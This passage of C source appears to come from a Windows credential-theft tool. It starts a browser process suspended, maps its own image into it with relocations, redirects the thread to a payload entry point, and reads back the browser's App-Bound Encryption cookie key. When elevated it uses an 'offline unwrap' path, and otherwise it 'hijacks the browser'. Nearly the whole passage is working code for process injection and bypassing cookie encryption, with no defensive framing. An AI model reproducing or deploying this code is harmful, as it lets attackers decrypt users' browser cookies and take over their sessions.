    _Out_ PVOID* Mapped)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    IMAGE_NT_HEADERS* Nt = RtlImageNtHeader(Self);
    IMAGE_SECTION_HEADER* Section;
    IMAGE_BASE_RELOCATION* Reloc;
    PUSHORT Entry;
    PBYTE Copy = NULL;
    PVOID Base = NULL;
    SIZE_T RegionSize, ZeroSize = 0;
    ULONG Size, Remaining, BlockSize, Count, Index, Old;
    ULONG64 Delta;
    NTSTATUS Status = STATUS_SUCCESS;

    *Mapped = NULL;
    if (Nt == NULL ||
        Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    Size = Nt->OptionalHeader.SizeOfImage;
    RegionSize = Size;
    Status = NtAllocateVirtualMemory(NtCurrentProcess(),
                                     &Copy,
                                     0,
                                     &RegionSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (NT_SUCCESS(Status))
    {
        RegionSize = Size;
        Status = NtAllocateVirtualMemory(Process,
                                         &Base,
                                         0,
                                         &RegionSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    }
    if (!NT_SUCCESS(Status))
    {
        if (Copy != NULL)
        {
            NtFreeVirtualMemory(NtCurrentProcess(), &Copy, &ZeroSize, MEM_RELEASE);
        }
        return Status;
    }
    RtlCopyMemory(Copy, Self, Size);
    Delta = (ULONG64)(ULONG_PTR)Base - (ULONG64)(ULONG_PTR)Self;
    if (Delta != 0)
    {
        Reloc = (IMAGE_BASE_RELOCATION*)(Copy +
            Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        Remaining = Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while (NT_SUCCESS(Status) && Remaining >= sizeof(*Reloc))
        {
            BlockSize = Reloc->SizeOfBlock;
            Count = BlockSize >= sizeof(*Reloc) ? (BlockSize - sizeof(*Reloc)) / sizeof(USHORT) : 0;
            Entry = (PUSHORT)(Reloc + 1);
            if (BlockSize < sizeof(*Reloc) || BlockSize > Remaining || Count > BlockSize)
            {
                Status = STATUS_INVALID_IMAGE_FORMAT;
                break;
            }
            for (Index = 0; Index < Count; Index++)
            {
                if ((Entry[Index] >> 12) == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG64*)(Copy + Reloc->VirtualAddress + (Entry[Index] & 0xFFF)) += Delta;
                }
                else if ((Entry[Index] >> 12) != IMAGE_REL_BASED_ABSOLUTE)
                {
                    Status = STATUS_NOT_SUPPORTED;
                    break;
                }
            }
            Remaining -= BlockSize;
            Reloc = (IMAGE_BASE_RELOCATION*)((PBYTE)Reloc + BlockSize);
        }
    }
    if (NT_SUCCESS(Status))
    {
        RtlCopyMemory(Copy + ((ULONG64)(ULONG_PTR)&ZpAbe_Request - (ULONG64)(ULONG_PTR)Self),
                      Request,
                      sizeof(*Request));
    }
    if (NT_SUCCESS(Status)) Status = NtWriteVirtualMemory(Process, Base, Copy, Size, NULL);
    if (NT_SUCCESS(Status))
    {
        Section = IMAGE_FIRST_SECTION(Nt);
        for (Index = 0; Index < Nt->FileHeader.NumberOfSections && NT_SUCCESS(Status); Index++)
        {
            if (Section[Index].Misc.VirtualSize != 0)
            {
                PVOID ProtectBase = (PBYTE)Base + Section[Index].VirtualAddress;
                SIZE_T ProtectSize = Section[Index].Misc.VirtualSize;
                ULONG Protect =
                    Section[Index].Characteristics & IMAGE_SCN_MEM_EXECUTE ?
                        (Section[Index].Characteristics & IMAGE_SCN_MEM_WRITE ?
                            PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) :
                    Section[Index].Characteristics & IMAGE_SCN_MEM_WRITE ?
                        PAGE_READWRITE : PAGE_READONLY;

                Status = NtProtectVirtualMemory(Process,
                                                &ProtectBase,
                                                &ProtectSize,
                                                Protect,
                                                &Old);
            }
        }
    }
    if (NT_SUCCESS(Status))
    {
        Status = NtFlushInstructionCache(Process, Base, Size);
    }
    NtFreeVirtualMemory(NtCurrentProcess(), &Copy, &ZeroSize, MEM_RELEASE);
    if (NT_SUCCESS(Status))
    {
        *Mapped = Base;
    }
    else
    {
        NtFreeVirtualMemory(Process, &Base, &ZeroSize, MEM_RELEASE);
    }
    return Status;
}

static
NTSTATUS
ZpAbeRunAcquisition(
    _In_ PCWSTR Executable,
    _In_ const ZP_ABE_REQUEST* Request,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_ PLONG Code)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    STARTUPINFOW StartupInfo;
    PROCESS_INFORMATION ProcessInfo;
    LARGE_INTEGER Timeout;
    PVOID Mapped = NULL;
    LONG Pending;
    HANDLE Process, Thread;
    ULONG Index;
    NTSTATUS Status;

    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
    StartupInfo.cb = sizeof(StartupInfo);
    if (!CreateProcessInternalW(NULL,
                                Executable,
                                NULL,
                                NULL,
                                NULL,
                                FALSE,
                                CREATE_SUSPENDED,
                                NULL,
                                NULL,
                                &StartupInfo,
                                &ProcessInfo,
                                NULL))
    {
        return NTSTATUS_FROM_WIN32(GetLastError());
    }
    Process = ProcessInfo.hProcess;
    Thread = ProcessInfo.hThread;
    Status = ZpAbeMapSelf(Process, Request, &Mapped);
    if (NT_SUCCESS(Status))
    {
        CONTEXT Context;

        ZeroMemory(&Context, sizeof(Context));
        Context.ContextFlags = CONTEXT_CONTROL;
        Status = NtGetContextThread(Thread, &Context);
        if (NT_SUCCESS(Status))
        {
#if defined(_M_ARM64) || defined(_M_ARM64EC)
            Context.Pc = (DWORD64)(ULONG_PTR)Mapped +
                         ((ULONG64)(ULONG_PTR)ZpAbe_PayloadEntry - (ULONG64)(ULONG_PTR)Self);
#else
            Context.Rip = (DWORD64)(ULONG_PTR)Mapped +
                          ((ULONG64)(ULONG_PTR)ZpAbe_PayloadEntry - (ULONG64)(ULONG_PTR)Self);
#endif
            Status = NtSetContextThread(Thread, &Context);
        }
        if (NT_SUCCESS(Status)) Status = NtResumeThread(Thread, NULL);
    }
    if (NT_SUCCESS(Status))
    {
        Status = STATUS_TIMEOUT;
        for (Index = 0; Index < ZP_ABE_POLL_COUNT; Index++)
        {
            if (NT_SUCCESS(NtReadVirtualMemory(Process,
                                               (PBYTE)Mapped +
                                                   ((ULONG64)(ULONG_PTR)&ZpAbe_Pending -
                                                    (ULONG64)(ULONG_PTR)Self),
                                               &Pending,
                                               sizeof(Pending),
                                               NULL)) &&
                Pending != 0)
            {
                NtReadVirtualMemory(Process,
                                    (PBYTE)Mapped +
                                        ((ULONG64)(ULONG_PTR)&ZpAbe_Code -
                                         (ULONG64)(ULONG_PTR)Self),
                                    Code,
                                    sizeof(*Code),
                                    NULL);
                if (*Code == 0)
                {
                    Status = NT_SUCCESS(NtReadVirtualMemory(Process,
                                                            (PBYTE)Mapped +
                                                                ((ULONG64)(ULONG_PTR)ZpAbe_Key -
                                                                 (ULONG64)(ULONG_PTR)Self),
                                                            Key,
                                                            32,
                                                            NULL)) ?
                             STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
                }
                else
                {
                    Status = STATUS_UNSUCCESSFUL;
                }
                break;
            }
            Timeout.QuadPart = -(LONGLONG)ZP_ABE_POLL_SLACK_MS * 10000;
            if (NtWaitForSingleObject(Process, FALSE, &Timeout) == STATUS_WAIT_0)
            {
                /* the payload parks instead of exiting: an early exit means
                 * it died without publishing anything */
                Status = STATUS_UNSUCCESSFUL;
                break;
            }
        }
    }
    /* reap first, nothing else: the address space reclaims the mapped image,
     * so there is deliberately no remote free of the mapping */
    NtTerminateProcess(Process, STATUS_SUCCESS);
    Timeout.QuadPart = -(LONGLONG)3 * 1000 * 10000;
    NtWaitForSingleObject(Process, FALSE, &Timeout);
    NtClose(Thread);
    NtClose(Process);
    return Status;
}

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode)
{
    static ZP_ABE_REQUEST Request;      /* patched into the staging copy */
    ZP_ABE_CACHE_ENTRY* Entry;
    LARGE_INTEGER Timeout;
    WCHAR Executable[MAX_PATH], LocalState[MAX_PATH];
    BYTE BlobHash[32];
    LONG Code = (LONG)0x80004005L;
    LONG Envelope = 0, Method = ZP_ABE_METHOD_HIJACK;
    NTSTATUS Status;

    if (ResultCode != NULL) *ResultCode = 0;
    if (Browser >= ARRAYSIZE(ZpAbeBrowsers) || Key == NULL) return STATUS_INVALID_PARAMETER;
    Entry = &ZpAbe_Cache[Browser];

    Status = ZpAbeEnsureCache();
    if (NT_SUCCESS(Status) && !ZpAbeGetPaths(Browser, Executable, LocalState))
    {
        Status = STATUS_NOT_FOUND;
    }
    if (NT_SUCCESS(Status))
    {
        Request.Browser = Browser;
        Status = ZpAbeReadAppBoundBlob(LocalState, Request.Blob, &Request.BlobLength);
    }
    if (NT_SUCCESS(Status)) Status = ZpAbeHashSha256(Request.Blob, Request.BlobLength, BlobHash);

    while (NT_SUCCESS(Status))
    {
        ZpAbeAcquireEntry(Entry);
        if (Entry->State >= 2 && RtlEqualMemory(Entry->BlobHash, BlobHash, sizeof(BlobHash)))
        {
            if (Entry->State == 3 && GetTickCount64() >= Entry->RetryTime)
            {
                Entry->State = 0;
            }
            else
            {
                Status = Entry->Status;
                Code = Entry->Result;
                if (Entry->State == 2) RtlCopyMemory(Key, Entry->Key, 32);
                ZpAbeReleaseEntry(Entry);
                break;
            }
        }
        if (Entry->State == 1)
        {
            ZpAbeReleaseEntry(Entry);
            Timeout.QuadPart = -(LONGLONG)ZP_ABE_WAIT_SLACK_MS * 10000;
            if (NtWaitForSingleObject(Entry->Changed, FALSE, &Timeout) == STATUS_TIMEOUT)
            {
                Status = STATUS_TIMEOUT;
                break;
            }
            continue;
        }
        Entry->State = 1;
        RtlCopyMemory(Entry->BlobHash, BlobHash, sizeof(BlobHash));
        NtResetEvent(Entry->Changed, NULL);
        ZpAbeReleaseEntry(Entry);

        /* leader: expensive phase outside the entry lock; elevated clients
         * prefer the offline unwrap, everything else hijacks the browser */
        if (ZpAbeIsElevated() &&
            ZpAbeAcquireElevated(&ZpAbeBrowsers[Browser],
                                 Request.Blob,
                                 Request.BlobLength,
                                 Key,
                                 &Envelope))
        {
            Status = STATUS_SUCCESS;
            Code = 0;
            Method = ZP_ABE_METHOD_ELEVATE;
        } else
        {
            Envelope = 0;
            Code = (LONG)0x80004005L;
            Status = ZpAbeRunAcquisition(Executable, &Request, Key, &Code);
            Method = ZP_ABE_METHOD_HIJACK;
        }

        ZpAbeAcquireEntry(Entry);
        RtlSecureZeroMemory(Entry->Key, sizeof(Entry->Key));
        if (NT_SUCCESS(Status)) RtlCopyMemory(Entry->Key, Key, 32);
        Entry->Status = Status;
        Entry->Result = Code;
        Entry->Method = Method;
        Entry->Envelope = Envelope;
        Entry->State = NT_SUCCESS(Status) ? 2 : 3;
        Entry->RetryTime = NT_SUCCESS(Status) ? 0 : GetTickCount64() + ZP_ABE_FAILURE_RETRY_MS;
        NtSetEvent(Entry->Changed, NULL);
        ZpAbeReleaseEntry(Entry);
        break;
    }
    if (ResultCode != NULL) *ResultCode = (ULONG)Code;
    return Status;
}

#endif /* !_M_IX86 */
